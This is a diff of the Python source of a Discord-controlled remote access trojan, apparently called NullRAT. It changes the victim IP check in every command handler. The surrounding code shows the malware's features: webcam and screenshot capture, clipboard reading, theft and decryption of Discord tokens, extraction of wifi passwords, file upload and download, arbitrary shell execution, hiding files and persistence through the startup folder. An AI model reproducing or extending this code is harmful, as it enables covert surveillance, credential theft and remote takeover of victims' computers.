@@ -145,7 +145,7 @@ async def get_webcam(ctx, victim):
     ],
 )
 async def get_systeminfo(ctx, victim):
-    if str(victim) == str(IP()):
+    if str(victim) == str(ip_addr):
         await ctx.response.defer()
         
         subprocess.run(
@@ -170,7 +170,7 @@ async def get_systeminfo(ctx, victim):
     ],
 )
 async def get_screenshot(ctx, victim):
-    if str(victim) == str(IP()):
+    if str(victim) == str(ip_addr):
         await ctx.response.defer()
         
         with mss() as sct: 
@@ -189,7 +189,7 @@ async def get_screenshot(ctx, victim):
     ],
 )
 async def get_clipboard(ctx, victim):
-    if str(victim) == str(IP()):
+    if str(victim) == str(ip_addr):
         await ctx.response.defer()
         
         outp = os.popen("powershell Get-Clipboard").read()
@@ -208,7 +208,7 @@ async def get_clipboard(ctx, victim):
     ],
 )
 async def get_rawtokens(ctx, victim):
-    if str(victim) == str(IP()):
+    if str(victim) == str(ip_addr):
         await ctx.response.defer()
         
         message, tokens = "", find_token()
@@ -231,7 +231,7 @@ async def get_rawtokens(ctx, victim):
     ],
 )
 async def get_chktokens(ctx, victim):
-    if str(victim) == str(IP()):
+    if str(victim) == str(ip_addr):
         await ctx.response.defer()
         valid, email, phone, uname, nitro, bill, avatar, idq = [], [], [], [], [], [], [], []
 
@@ -261,7 +261,7 @@ async def get_chktokens(ctx, victim):
 
 @client.slash_command(description="[EXPERIMENTAL] Decrypts encrypted Discord Tokens")
 async def discord_tokens(ctx, victim):
-    if str(victim) == str(IP()):
+    if str(victim) == str(ip_addr):
         import os
         await ctx.response.defer()
         try:
@@ -287,7 +287,7 @@ async def discord_tokens(ctx, victim):
 
 @client.slash_command(description="[EXPERIMENTAL] Decrypts and checks encrypted Discord Tokens")
 async def discord_checked(ctx, victim):
-    if str(victim) == str(IP()):
+    if str(victim) == str(ip_addr):
         import os
         await ctx.response.defer()
         try:
@@ -329,12 +329,12 @@ async def discord_checked(ctx, victim):
 # Directory Manipulation #
 @client.slash_command(description="Returns Current Working Directory")
 async def get_workingdir(ctx, victim):
-    if str(victim) == str(IP()):
+    if str(victim) == str(ip_addr):
        await ctx.response.send_message(embed=EmbedGen("Current directory", "The present directory is: ", f"```{os.getcwd()}```"))
     
 @client.slash_command(description="Send file to victim's PC")
 async def sendfiles(ctx, victim, url, file_name, file_path=nr_working):
-    if str(victim) == str(IP()):
+    if str(victim) == str(ip_addr):
         await ctx.response.defer()
         if '"' in file_path:
             file_path = file_path.replace('"','')
@@ -346,7 +346,7 @@ async def sendfiles(ctx, victim, url, file_name, file_path=nr_working):
 
 @client.slash_command(description="Receives file from victim's PC")
 async def receivefiles(ctx, victim, file):
-    if str(victim) == str(IP()):
+    if str(victim) == str(ip_addr):
         await ctx.response.defer()
         if '"' in file:
             file = file.replace('"','')
@@ -361,7 +361,7 @@ async def receivefiles(ctx, victim, file):
 
 @client.slash_command(description="Change directory to specified location")
 async def change_directory(ctx, victim, directory):
-    if str(victim) == str(IP()):
+    if str(victim) == str(ip_addr):
         try:
             os.chdir(directory)
             return await ctx.response.send_message(embed=EmbedGen("CD information",  "Changed directory to:", f"```{os.getcwd()}```"))
@@ -370,7 +370,7 @@ async def change_directory(ctx, victim, directory):
 
 @client.slash_command(description="Finds contents of directory")
 async def list_directory(ctx, victim, directory_to_find="null"):
-    if str(victim) == str(IP()):
+    if str(victim) == str(ip_addr):
         await ctx.response.defer()
         if directory_to_find == "null":
             directory_to_find = os.getcwd()
@@ -391,7 +391,7 @@ async def list_directory(ctx, victim, directory_to_find="null"):
 # Misc. Commands #
 @client.slash_command(description="Add NullRAT to startup directory")
 async def startup(ctx, victim):
-    if str(victim) == str(IP()):
+    if str(victim) == str(ip_addr):
         from sys import executable; msg = "```\n"
         await ctx.response.send_message(embed = Embed(title = "Last known RAT directory: \n" + original_dir + "\n\nCurrent Directory: \n" + os.getcwd(), color = 0x0081FA))
         os.chdir(original_dir)
@@ -403,7 +403,7 @@ async def startup(ctx, victim):
 
 @client.slash_command(description="Executes shell commands")
 async def shell(ctx, victim, msg): 
-    if str(victim) == str(IP()):
+    if str(victim) == str(ip_addr):
         await ctx.response.defer()
         global status; status = None
         from threading import Thread
@@ -439,18 +439,18 @@ async def shell(ctx, victim, msg):
 
 @client.slash_command(description="Lists all wifi networks")
 async def wifilist(ctx, victim):
-    if str(victim) == str(IP()):
+    if str(victim) == str(ip_addr):
         await ctx.response.send_message(f"```{os.popen('netsh wlan show profiles').read().replace('All', '').replace('Profile', 'Network')}```")
 
 @client.slash_command(description="Lists specified wifi password")
 async def wifipass(ctx, victim, name):
-    if str(victim) == str(IP()):
+    if str(victim) == str(ip_addr):
         a = os.popen('netsh wlan show profile '+'"'+name.lstrip().rstrip()+'" '+"key=clear | findstr Key")
         await ctx.response.send_message(f"```{a.read()}```")
         
 @client.slash_command(description="Hide file")
 async def hidefile(ctx, victim, file):
-    if str(victim) == str(IP()): 
+    if str(victim) == str(ip_addr): 
         if '"' in file:
             file = file.replace('"','')
         output = os.popen("attrib +h " + '"' + file + '"').read()
@@ -460,7 +460,7 @@ async def hidefile(ctx, victim, file):
                     
 @client.slash_command(description="Unhide file")
 async def unhidefile(ctx, victim, file):
-    if str(victim) == str(IP()): 
+    if str(victim) == str(ip_addr): 
         if '"' in file:
             file = file.replace('"','')
         output = os.popen("attrib -h " + '"' + file + '"').read()
@@ -470,7 +470,7 @@ async def unhidefile(ctx, victim, file):
             
 @client.slash_command(description="Quits NullRAT from specified IP")
 async def close(ctx, victim):
-    if str(victim) == str(IP()):
+    if str(victim) == str(ip_addr):
         await ctx.response.send_message(embed=EmbedGen("Information", "Given IP is " + IP(), "Closing NullRAT..."))
         await client.close()
     if "." not in ip:
